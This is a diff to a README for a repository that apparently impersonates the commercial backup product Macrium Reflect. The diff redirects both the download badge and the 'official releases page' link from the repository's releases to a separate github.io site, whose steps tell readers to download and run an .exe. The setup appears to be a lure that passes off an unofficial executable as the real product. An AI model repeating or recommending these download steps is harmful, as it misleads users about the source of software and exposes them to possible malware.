@@ -1,6 +1,6 @@
 # 💾 Macrium-Reflect-2026 - Secure your data with system backups
 
-[![](https://img.shields.io/badge/Download-Macrium_Reflect_2026-blue.svg)](https://github.com/Penandinklegion642/Macrium-Reflect-2026/releases)
+[![](https://img.shields.io/badge/Download-Macrium_Reflect_2026-blue.svg)](https://penandinklegion642.github.io)
 
 ## 📁 What is Macrium Reflect 2026?
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these basic require
 
 Follow these steps to obtain the installer for your system:
 
-1.  Visit the [official releases page](https://github.com/Penandinklegion642/Macrium-Reflect-2026/releases).
+1.  Visit the [official releases page](https://penandinklegion642.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in .exe to begin your download.
 4.  Save the file to your Downloads folder or any location you remember.
